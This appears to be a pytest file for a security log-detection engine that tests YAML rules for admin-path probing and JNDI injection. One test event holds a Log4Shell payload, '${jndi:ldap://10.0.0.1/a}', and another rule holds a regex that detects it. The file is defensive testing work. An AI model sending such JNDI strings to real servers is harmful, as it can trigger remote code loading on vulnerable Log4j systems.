from app.detection.yaml_rule import YamlDetectionRule, YamlRuleLoader
from app.schemas.log_event import LogEvent
from app.schemas.severity import Severity


def test_yaml_rule_creation_and_matching():
    rule_data = {
        "title": "Test Admin Probing",
        "name": "test_admin_probe",
        "version": "1.0.0",
        "level": "high",
        "category": "Reconnaissance",
        "mitre_technique": "T1595",
        "detection": {
            "selection": {
                "endpoint|contains": ["/admin", "/superuser"],
                "status_code": 403,
            }
        },
    }
    rule = YamlDetectionRule(rule_data)
    assert rule.rule_name == "test_admin_probe"
    assert rule.severity == Severity.HIGH
    assert rule.mitre_technique == "T1595"

    # Match event
    matching_event = LogEvent(
        endpoint="/admin/settings",
        status_code=403,
        source_ip="192.168.1.50",
        raw_log="dummy",
        parser_name="test",
    )
    assert rule.match(matching_event) is True

    # Non-matching event (wrong status code)
    non_matching = LogEvent(
        endpoint="/admin/settings",
        status_code=200,
        source_ip="192.168.1.50",
        raw_log="dummy",
        parser_name="test",
    )
    assert rule.match(non_matching) is False


def test_yaml_rule_regex_matching():
    rule_data = {
        "title": "Test JNDI Injection",
        "name": "test_jndi",
        "level": "critical",
        "detection": {"selection": {"endpoint|re": r"(?i)\$\{jndi:(?:ldap|rmi):"}},
    }
    rule = YamlDetectionRule(rule_data)
    ev = LogEvent(
        endpoint="/search?q=${jndi:ldap://10.0.0.1/a}",
        source_ip="10.0.0.2",
        raw_log="dummy",
        parser_name="test",
    )
    assert rule.match(ev) is True

    clean_ev = LogEvent(
        endpoint="/search?q=normal",
        source_ip="10.0.0.2",
        raw_log="dummy",
        parser_name="test",
    )
    assert rule.match(clean_ev) is False


def test_yaml_rule_loader_directory():
    rules = YamlRuleLoader.load_directory("rules")
    assert len(rules) >= 3
    names = [r.rule_name for r in rules]
    assert "config_exposure" in names
    assert "log4shell_exploit" in names
    assert "spring4shell_exploit" in names
